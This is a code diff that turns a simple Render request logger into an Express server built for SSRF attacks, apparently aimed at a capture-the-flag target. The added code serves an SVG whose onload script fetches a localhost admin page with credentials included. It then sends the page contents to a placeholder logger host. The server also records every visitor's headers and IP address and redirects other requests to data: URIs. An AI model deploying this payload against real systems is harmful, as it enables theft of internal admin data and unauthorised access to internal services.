@@ -1,30 +1,33 @@
-// This module exports a single function that Render will use as a serverless endpoint.
-module.exports = (req, res) => {
-  // We'll keep a simple in-memory log of all requests to this endpoint.
-  // This will reset with each cold start of the serverless function.
+const express = require('express');
+const app = express();
+
+app.use((req, res) => {
   const requestDetails = {
     timestamp: new Date().toISOString(),
     method: req.method,
     url: req.url,
-    headers: req.headers
+    headers: req.headers,
+    ip: req.ip
   };
 
-  // Log the details to the console so you can see them in Render's logs.
-  console.log('Received request:', JSON.stringify(requestDetails, null, 2));
+  console.log('SSRF Request received:', JSON.stringify(requestDetails, null, 2));
 
-  // The core logic of the redirector.
-  // We check if the request is for our special '/log' endpoint.
-  if (req.url === '/log') {
-    // If it's the log request, we'll respond with a simple message.
-    res.setHeader('Content-Type', 'application/json');
-    res.status(200).json({
-      status: "Log endpoint is working.",
-      message: "Check Render's logs to see all incoming requests."
-    });
+  // Serve different content based on the path
+  if (req.url === '/malicious-image.svg') {
+    // Serve an SVG image that includes SSRF payload
+    res.setHeader('Content-Type', 'image/svg+xml');
+    res.send(`<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="fetch('http://localhost:8080/admin', {credentials: 'include'}).then(r => r.text()).then(d => { fetch('https://your-logger.com/log?data=' + encodeURIComponent(d)) });">
+  <rect width="100" height="100" fill="red"/>
+  <text x="50" y="50" text-anchor="middle" fill="white">SSRF</text>
+</svg>`);
+  } else if (req.url === '/log') {
+    res.json({ status: 'ok', logs: 'Check console' });
   } else {
-    // This is the part that performs the SSRF redirect.
-    // The browser might block this, but the vulnerable CTF server will not.
-    res.setHeader('Location', 'data:text/html;base64,PGh0bWw+PGhlYWQ+PHRpdGxlPlN1Y2Nlc3M8L3RpdGxlPjwvZ2hlYWQ+Ym9keT48aDE+Q1RGIEZsYWcgR2VuZXJhdGVkPC9oMT48L2JvZHk+PC9odG1sPg==');
-    res.status(302).end();
+    // Redirect to a valid image
+    res.redirect(302, 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj48cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgZmlsbD0icmVkIi8+PHRleHQgeD0iNTAiIHk9IjUwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSI+U1NSRjwvdGV4dD48L3N2Zz4=');
   }
-};
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`SSRF server running on port ${PORT}`));
